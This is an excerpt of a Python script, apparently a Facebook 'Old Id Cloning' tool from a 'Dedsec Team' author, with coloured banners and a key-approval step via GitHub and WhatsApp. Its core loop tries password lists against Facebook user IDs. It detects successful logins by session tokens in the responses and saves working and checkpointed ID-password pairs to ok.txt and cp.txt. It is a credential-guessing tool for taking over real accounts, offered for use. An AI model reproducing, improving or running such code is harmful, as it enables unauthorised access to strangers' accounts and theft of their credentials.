...
\____/\____\\____/\____/\____\\____/
 ...
 ───────────────────────────────────────────────────────×
  ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Dedsec\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :1.0\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
 """)
def logo2():
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version :3.1\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : Mohammad Riyad \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : https://github.com/riyadkhondoker01\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : https://www.facebook.com/im.your.daddy.mothafakar\x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
 """)
...
def helpnote():
	...
	exit(" [=>] FACEBOOK :  https://www.facebook.com/im.your.daddy.mothafakar")
...
def notice():
	...
	os.system("xdg-open https://wa.me/+8801310342361app=fbl")
	runtxt("\033[0;97m Your Key >> %s%s"%(G,basesplit))
	runtxt("\033[0;97m Approval Neyar Jonno Whatsapp A key Dao ")
	os.system("xdg-open https://wa.me/+8801310342361?text=")
	subprocess.check_output(["am", "start", "https://wa.me/+8801310342361?text="])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/riyadkhondoker01/Old-Id-Cloning/blob/main/Approval.txt').text
			if basesplit in plr:
				key = basesplit
...
───────────────────────────────────────────────────────× 
    """)
		print("%s [%s•%s] %sTOOL NAME : %sOld Id Cloning"%(G,R,G,B,G))
		...
		subprocess.check_output(["am", "start", "https://www.facebook.com/im.your.daddy.mothafakar"])
		print("───────────────────────────────────────────────────────× ")
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=Dedsec=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=Dedsec=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=Dedsec=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=Dedsec=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		print("")
		print("\n [*] Author    : Mohammad Riyad")
		print(" [*] Team      : -- Dedsec Team")
		print(" [ Sosial Medi  ] -- \n")
		print(" [*] Facebook  : https://www.facebook.com/im.your.daddy.mothafakar")
		print(" [*] Instagram : --/n")
		print(" [*] Facebook  : https://www.facebook.com/im.your.daddy.mothafakar")
		exit(" [*] GitHub    : https://github.com/riyadkhondoker01 ")
	else:
		Main()
